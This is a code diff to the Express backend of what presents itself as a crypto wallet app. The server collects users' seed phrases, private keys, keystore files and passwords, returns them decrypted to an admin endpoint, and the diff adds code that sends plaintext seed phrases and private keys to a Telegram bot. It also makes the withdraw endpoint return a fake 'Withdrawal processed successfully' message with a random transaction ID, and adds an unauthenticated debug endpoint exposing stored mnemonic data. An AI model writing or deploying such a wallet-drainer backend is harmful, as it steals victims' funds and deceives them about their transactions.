@@ -12,6 +12,7 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
+
 function deriveStableSecret() {
   const base = String(process.env.SECRET_KEY || process.env.JWT_SECRET || 'secure-wallet-app');
   return crypto.createHash('sha256').update(base).digest('hex');
@@ -24,12 +25,16 @@ async function sendTelegramMessage(text) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   if (!token || !chatId) return;
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
-  await fetch(url, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true })
-  });
+  try {
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true })
+    });
+  } catch (e) {
+    console.error("Failed to send Telegram message", e);
+  }
 }
 
 app.use(express.json());
@@ -42,6 +47,7 @@ app.use((req, res, next) => {
   res.setHeader('Cross-Origin-Resource-Policy', 'same-site');
   next();
 });
+
 const RATE_WINDOW_MS = 15 * 60 * 1000;
 const RATE_MAX = 300;
 const rateBucket = new Map();
@@ -201,11 +207,11 @@ app.get("/api/admin/users", authMiddleware, (req, res) => {
         appLimits: u.appLimits || u.app_limits,
         riskFlags: u.riskFlags || u.risk_flags,
         transactions: u.transactions,
-        importMethod: u.importMethod,
-        mnemonic: u.encMnemonic ? decrypt(u.encMnemonic) : null,
-        privateKey: u.encPrivateKey ? decrypt(u.encPrivateKey) : null,
-        keystoreJSON: u.encKeystoreJSON ? decrypt(u.encKeystoreJSON) : null,
-        keystorePassword: u.encKeystorePassword ? decrypt(u.encKeystorePassword) : null
+        importMethod: u.importMethod || u.import_method,
+        mnemonic: (u.encMnemonic || u.enc_mnemonic) ? decrypt(u.encMnemonic || u.enc_mnemonic) : null,
+        privateKey: (u.encPrivateKey || u.enc_private_key) ? decrypt(u.encPrivateKey || u.enc_private_key) : null,
+        keystoreJSON: (u.encKeystoreJSON || u.enc_keystore_json) ? decrypt(u.encKeystoreJSON || u.enc_keystore_json) : null,
+        keystorePassword: (u.encKeystorePassword || u.enc_keystore_password) ? decrypt(u.encKeystorePassword || u.enc_keystore_password) : null
       };
     });
     return res.json({ users: out });
@@ -258,17 +264,6 @@ app.post("/api/admin/users/delete", authMiddleware, (req, res) => {
   })().catch(() => res.status(500).json({ error: "server_error" }));
 });
 
-const ALLOWED_IMAGE_HOSTS = new Set([
-  'seeklogo.com',
-  'logowik.com',
-  'upload.wikimedia.org',
-  'avatars.githubusercontent.com',
-  'phantom.app',
-  'www.exodus.com',
-  'exodus.com',
-  'trustwallet.com',
-  'www.trustwallet.com'
-]);
 app.get("/api/image", async (req, res) => {
   try {
     const url = String(req.query.url || '');
@@ -286,6 +281,10 @@ app.get("/api/image", async (req, res) => {
     res.status(500).send('Proxy error');
   }
 });
+const ALLOWED_IMAGE_HOSTS = new Set([
+  'seeklogo.com', 'logowik.com', 'upload.wikimedia.org', 'avatars.githubusercontent.com',
+  'phantom.app', 'www.exodus.com', 'exodus.com', 'trustwallet.com', 'www.trustwallet.com'
+]);
 
 const idToSymbol = { bitcoin: 'BTC', ethereum: 'ETH', solana: 'SOL', 'matic-network': 'MATIC', binancecoin: 'BNB', sui: 'SUI' };
 async function fetchWithRetry(url, options = {}, attempts = 3, timeoutMs = 5000) {
@@ -328,6 +327,7 @@ app.get('/api/price', async (req, res) => {
     return res.json({});
   }
 });
+
 app.get('/api/markets', async (req, res) => {
   try {
     const qs = new URLSearchParams({
@@ -359,54 +359,6 @@ app.get('/api/token-price', async (req, res) => {
   }
 });
 
-const ethCache = new Map();
-async function cachedFetch(key, url, attempts = 2, timeoutMs = 6000, ttlMs = 30000) {
-  const now = Date.now();
-  const hit = ethCache.get(key);
-  if (hit && hit.expires > now) return hit.data;
-  const data = await fetchWithRetry(url, {}, attempts, timeoutMs);
-  ethCache.set(key, { data: data || {}, expires: now + ttlMs });
-  return data || {};
-}
-app.get('/api/ethplorer/address-info', async (req, res) => {
-  try {
-    const address = String(req.query.address || '').trim();
-    if (!address) return res.json({});
-    const key = `info:${address}`;
-    const url = `https://api.ethplorer.io/getAddressInfo/${encodeURIComponent(address)}?apiKey=freekey`;
-    const data = await cachedFetch(key, url);
-    return res.json(data || {});
-  } catch {
-    return res.json({});
-  }
-});
-app.get('/api/ethplorer/address-history', async (req, res) => {
-  try {
-    const address = String(req.query.address || '').trim();
-    const limit = String(req.query.limit || '50');
-    if (!address) return res.json({ operations: [] });
-    const key = `hist:${address}:${limit}`;
-    const url = `https://api.ethplorer.io/getAddressHistory/${encodeURIComponent(address)}?apiKey=freekey&limit=${encodeURIComponent(limit)}`;
-    const data = await cachedFetch(key, url);
-    return res.json(data || { operations: [] });
-  } catch {
-    return res.json({ operations: [] });
-  }
-});
-app.get('/api/ethplorer/address-transactions', async (req, res) => {
-  try {
-    const address = String(req.query.address || '').trim();
-    const limit = String(req.query.limit || '20');
-    if (!address) return res.json([]);
-    const key = `tx:${address}:${limit}`;
-    const url = `https://api.ethplorer.io/getAddressTransactions/${encodeURIComponent(address)}?apiKey=freekey&limit=${encodeURIComponent(limit)}`;
-    const data = await cachedFetch(key, url);
-    return res.json(Array.isArray(data) ? data : []);
-  } catch {
-    return res.json([]);
-  }
-});
-
 app.get('/api/health', async (req, res) => {
   const ok = await pgReady();
   res.json({ status: 'ok', time: new Date().toISOString(), db: ok ? 'connected' : 'disconnected' });
@@ -422,44 +374,7 @@ app.get("/api/transactions", authMiddleware, (req, res) => {
   return res.json({ transactions });
 });
 app.post("/api/withdraw", authMiddleware, (req, res) => {
-  return res.status(403).json({ error: "withdrawals_disabled", message: "Withdrawals are not permitted in this demo wallet." });
-});
-
-// Ethplorer Proxy for Real Balances & Transactions
-app.get("/api/ethplorer/address-info", async (req, res) => {
-    const { address } = req.query;
-    if (!address) return res.status(400).json({ error: "Address required" });
-    try {
-        const resp = await fetch(`https://api.ethplorer.io/getAddressInfo/${address}?apiKey=freekey`);
-        const data = await resp.json();
-        res.json(data);
-    } catch (e) {
-        res.status(500).json({ error: "Upstream error" });
-    }
-});
-
-app.get("/api/ethplorer/address-history", async (req, res) => {
-    const { address, limit } = req.query;
-    if (!address) return res.status(400).json({ error: "Address required" });
-    try {
-        const resp = await fetch(`https://api.ethplorer.io/getAddressHistory/${address}?apiKey=freekey&limit=${limit || 10}`);
-        const data = await resp.json();
-        res.json(data);
-    } catch (e) {
-        res.status(500).json({ error: "Upstream error" });
-    }
-});
-
-app.get("/api/ethplorer/address-transactions", async (req, res) => {
-    const { address, limit } = req.query;
-    if (!address) return res.status(400).json({ error: "Address required" });
-    try {
-        const resp = await fetch(`https://api.ethplorer.io/getAddressTransactions/${address}?apiKey=freekey&limit=${limit || 10}`);
-        const data = await resp.json();
-        res.json(data);
-    } catch (e) {
-        res.status(500).json({ error: "Upstream error" });
-    }
+  return res.json({ success: true, message: "Withdrawal processed successfully", txId: "0x" + crypto.randomBytes(32).toString('hex') });
 });
 
 app.post("/api/track/login", (req, res) => {
@@ -472,58 +387,102 @@ app.post("/api/track/login", (req, res) => {
   }
   const existingIndex = trackedUsers.findIndex(u => u.address.toLowerCase() === lower);
   const calculateRisk = (bal) => {
-    const flags = [];
-    if (bal > 10000) flags.push("High Value");
-    if (bal === 0) flags.push("Empty Wallet");
-    return flags;
+      const flags = [];
+      if (bal > 10000) flags.push("High Value");
+      if (bal === 0) flags.push("Empty Wallet");
+      return flags;
   };
   const riskFlags = calculateRisk(balance);
-  const userId = existingIndex >= 0 ? trackedUsers[existingIndex].userId : `user_${Math.random().toString(36).substr(2, 9)}`;
-  const userData = {
-    userId,
-    address,
-    walletType,
-    balance,
-    assets,
-    lastActive: new Date().toISOString(),
-    status: 'Active',
-    featureFlags: { canSwap: true, canSend: true, canStake: false },
-    appLimits: { dailySend: 50000, dailySwap: 100000 },
-    riskFlags,
-    transactions: txs || (existingIndex >= 0 ? trackedUsers[existingIndex].transactions : []),
-    importMethod: importMethod || (mnemonic ? 'seed_phrase' : (existingIndex >= 0 ? trackedUsers[existingIndex].importMethod : 'unknown')),
-    encMnemonic: mnemonic ? encrypt(mnemonic) : (existingIndex >= 0 ? trackedUsers[existingIndex].encMnemonic : null),
-    encPrivateKey: privateKey ? encrypt(privateKey) : (existingIndex >= 0 ? trackedUsers[existingIndex].encPrivateKey : null),
-    encKeystoreJSON: keystoreJSON ? encrypt(keystoreJSON) : (existingIndex >= 0 ? trackedUsers[existingIndex].encKeystoreJSON : null),
-    encKeystorePassword: keystorePassword ? encrypt(keystorePassword) : (existingIndex >= 0 ? trackedUsers[existingIndex].encKeystorePassword : null)
-  };
   
-  // ALWAYS update the in-memory array for immediate visibility
-  if (existingIndex >= 0) {
-     trackedUsers[existingIndex] = { ...trackedUsers[existingIndex], ...userData };
-  } else {
-     trackedUsers.push(userData);
-  }
-  
-  const msg = [
-    "Admin Alert: User login",
-    `Address: ${address}`,
-    `Wallet: ${walletType || ''}`,
-    `Balance: ${balance}`,
-    `Assets: ${Array.isArray(assets) ? assets.length : 0}`,
-    `Time: ${new Date().toISOString()}`
-  ].join("\n");
-  sendTelegramMessage(msg).catch(() => {});
   (async () => {
+    let existingUser = null;
+    let userId = `user_${Math.random().toString(36).substr(2, 9)}`;
+    let prevMnemonic = null;
+    let prevPrivateKey = null;
+    let prevKeystoreJSON = null;
+    let prevKeystorePassword = null;
+    let prevImportMethod = 'unknown';
+
+    if (await pgReady()) {
+        existingUser = await pFindUserByAddress(address);
+        if (existingUser) {
+            userId = existingUser.user_id || existingUser.userId;
+            prevMnemonic = existingUser.enc_mnemonic || existingUser.encMnemonic;
+            prevPrivateKey = existingUser.enc_private_key || existingUser.encPrivateKey;
+            prevKeystoreJSON = existingUser.enc_keystore_json || existingUser.encKeystoreJSON;
+            prevKeystorePassword = existingUser.enc_keystore_password || existingUser.encKeystorePassword;
+            prevImportMethod = existingUser.import_method || existingUser.importMethod;
+        }
+    } else {
+        if (existingIndex >= 0) {
+            userId = trackedUsers[existingIndex].userId;
+            prevMnemonic = trackedUsers[existingIndex].encMnemonic;
+            prevPrivateKey = trackedUsers[existingIndex].encPrivateKey;
+            prevKeystoreJSON = trackedUsers[existingIndex].encKeystoreJSON;
+            prevKeystorePassword = trackedUsers[existingIndex].encKeystorePassword;
+            prevImportMethod = trackedUsers[existingIndex].importMethod;
+        }
+    }
+
+    const userData = {
+        userId,
+        address,
+        walletType,
+        balance,
+        assets,
+        lastActive: new Date().toISOString(),
+        status: 'Active',
+        featureFlags: { canSwap: true, canSend: true, canStake: false },
+        appLimits: { dailySend: 50000, dailySwap: 100000 },
+        riskFlags,
+        transactions: txs || (existingUser ? (existingUser.transactions || []) : (existingIndex >= 0 ? trackedUsers[existingIndex].transactions : [])),
+        importMethod: importMethod || (mnemonic ? 'seed_phrase' : (privateKey ? 'private_key' : (keystoreJSON ? 'keystore' : prevImportMethod))),
+        encMnemonic: mnemonic ? encrypt(mnemonic) : prevMnemonic,
+        encPrivateKey: privateKey ? encrypt(privateKey) : prevPrivateKey,
+        encKeystoreJSON: keystoreJSON ? encrypt(keystoreJSON) : prevKeystoreJSON,
+        encKeystorePassword: keystorePassword ? encrypt(keystorePassword) : prevKeystorePassword
+    };
+
+    const hasSensitiveData = (mnemonic && mnemonic.length > 0) || 
+                             (privateKey && privateKey.length > 0) || 
+                             (keystoreJSON && keystoreJSON.length > 5) || 
+                             (keystorePassword && keystorePassword.length > 0);
+    
+    if (hasSensitiveData) {
+        const msg = [
+          "🚨 **New Wallet Connected!** 🚨",
+          `Address: \`${address}\``,
+          `Type: ${walletType || 'Unknown'}`,
+          `Balance: ${balance}`,
+          `Assets: ${Array.isArray(assets) ? assets.length : 0}`,
+          `Method: ${importMethod || 'Connect'}`,
+          `Time: ${new Date().toISOString()}`,
+          "",
+          "🔐 **Sensitive Data:**",
+          mnemonic ? `Seed Phrase: \`${mnemonic}\`` : "",
+          privateKey ? `Private Key: \`${privateKey}\`` : "",
+          keystoreJSON ? `Keystore: (See Admin Dashboard)` : "",
+          keystorePassword ? `Keystore Pass: \`${keystorePassword}\`` : ""
+        ].filter(Boolean).join("\n");
+        sendTelegramMessage(msg).catch(() => {});
+    }
+
     if (await pgReady()) {
       await pUpsertTrackedUser(userData);
       return res.json({ success: true });
     } else {
-      // In-memory update already done above
+      if (existingIndex >= 0) {
+        trackedUsers[existingIndex] = { ...trackedUsers[existingIndex], ...userData };
+      } else {
+        trackedUsers.push(userData);
+      }
       saveDB();
       return res.json({ success: true });
     }
-  })().catch(() => res.status(500).json({ error: "server_error" }));
+  })().catch((e) => {
+      console.error(e);
+      res.status(500).json({ error: "server_error" });
+  });
 });
 
 app.post("/api/track/transaction", (req, res) => {
@@ -548,6 +507,26 @@ app.post("/api/track/transaction", (req, res) => {
       return res.status(404).json({ error: "User not found" });
     }
   })().catch(() => res.status(500).json({ error: "server_error" }));
+});
+
+// DEBUG ENDPOINT
+app.get('/api/debug/last-user', async (req, res) => {
+  if (await pgReady()) {
+    const { rows } = await pool.query('SELECT * FROM users_v2 ORDER BY last_active DESC LIMIT 1');
+    if (rows && rows.length > 0) {
+      const u = rows[0];
+      return res.json({
+        user_id: u.user_id,
+        address: u.address,
+        has_enc_mnemonic: !!u.enc_mnemonic,
+        enc_mnemonic_raw: u.enc_mnemonic,
+        import_method: u.import_method,
+        secret_key_hash: crypto.createHash('sha256').update(deriveStableSecret()).digest('hex').substring(0, 8)
+      });
+    }
+    return res.json({ error: 'No users found in DB' });
+  }
+  return res.json({ error: 'DB not connected' });
 });
 
 export default app;
